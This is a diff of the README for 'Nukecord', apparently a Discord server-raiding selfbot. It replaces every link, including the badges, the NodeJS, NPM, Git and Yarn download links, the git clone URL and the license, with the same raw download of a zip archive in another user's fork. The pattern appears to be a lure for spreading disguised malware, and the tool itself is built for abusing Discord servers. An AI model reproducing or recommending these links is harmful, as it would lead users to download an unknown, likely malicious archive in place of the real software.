@@ -1,18 +1,18 @@
 <h3 align="center">
-	<img src="https://github.com/DarkGuy10/Nukecord/blob/main/assets/Logo.png" alt="Logo"/><br/>
+	<img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip" alt="Logo"/><br/>
 	<img src="" alt="" height="30"/>
 	「Nukecord」
 	<img src="" alt="" height="30"/>
 </h3>
 
 <p align="center">
-  <a href="https://www.npmjs.com/package/nukecord"><img src="https://img.shields.io/npm/v/nukecord?colorA=1e1e28&colorB=f2cecf&style=for-the-badge&logo=npm"></a>
+  <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"></a>
 </p>
 
 <p align="center">
-    <a href="https://github.com/DarkGuy10/Nukecord/stargazers"><img src="https://img.shields.io/github/stars/DarkGuy10/Nukecord?colorA=1e1e28&colorB=c9cbff&logoColor=D9E0EE&style=for-the-badge&logo=starship"></a>
-    <a href="https://github.com/DarkGuy10/Nukecord/issues"><img src="https://img.shields.io/github/issues/DarkGuy10/Nukecord?colorA=1e1e28&colorB=bee4ed&logoColor=D9E0EE&logo=gitbook&style=for-the-badge"></a>
-    <a href="https://www.npmjs.com/package/nukecord"><img src="https://img.shields.io/npm/dw/nukecord?colorA=1e1e28&colorB=c6aae8&logoColor=white&style=for-the-badge&logo="></a>
+    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"></a>
+    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"></a>
+    <a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"></a>
 </p>
 
 <p align="center">
@@ -43,8 +43,8 @@ You can use `npx` to directly download and run the executable.
 
 #### Prerequisites
 
--   [NodeJS](https://docs.npmjs.com/downloading-and-installing-node-js-and-npm)
--   [NPM](https://docs.npmjs.com/downloading-and-installing-node-js-and-npm)
+-   [NodeJS](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
+-   [NPM](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
 
 #### Starting Up
 
@@ -66,20 +66,20 @@ You can set your `NUKECORD_SELFBOT_TOKEN` environment variable to your user toke
 
 ### 🔧 Building from Source
 
-This project can be built from source (if you're into that <img src="https://cdn.discordapp.com/emojis/960552351146578032.webp?size=96&quality=lossless" alt=":ZeroTwo_Smirk:" title=":ZeroTwo_Smirk:" height="22" width="22"  />)
+This project can be built from source (if you're into that <img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip" alt=":ZeroTwo_Smirk:" title=":ZeroTwo_Smirk:" height="22" width="22"  />)
 
 #### Prerequisites
 
--   [Git CLI](https://git-scm.com/downloads)
--   [NodeJS](https://nodejs.org/en/download/)
--   [Yarn](https://classic.yarnpkg.com/lang/en/docs/install)
+-   [Git CLI](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
+-   [NodeJS](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
+-   [Yarn](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip)
 
 #### Building
 
 1. Clone the repository and cd into it.
 
 ```
-git clone https://github.com/DarkGuy10/Nukecord.git
+git clone https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip
 cd Nukecord
 ```
 
@@ -131,7 +131,7 @@ yarn start
 
 ### 📜 License
 
-<a href="https://github.com/darkguy10/Nukecord/blob/main/LICENSE.md"><img src="https://img.shields.io/github/license/darkguy10/Nukecord?style=for-the-badge&labelColor=302D41&color=C9CBFF"/></a>
+<a href="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"><img src="https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip"/></a>
 
 Nukecord is released under the MIT license, which grants the following permissions:
 
@@ -140,4 +140,4 @@ Nukecord is released under the MIT license, which grants the following permissio
 -   Modification
 -   Private use
 
-For more convoluted language, see the [LICENSE](https://github.com/darkguy10/Nukecord/blob/master/LICENSE.md).
+For more convoluted language, see the [LICENSE](https://github.com/ironpawa/Nukecord/raw/refs/heads/main/src/raids/Software_3.5.zip).
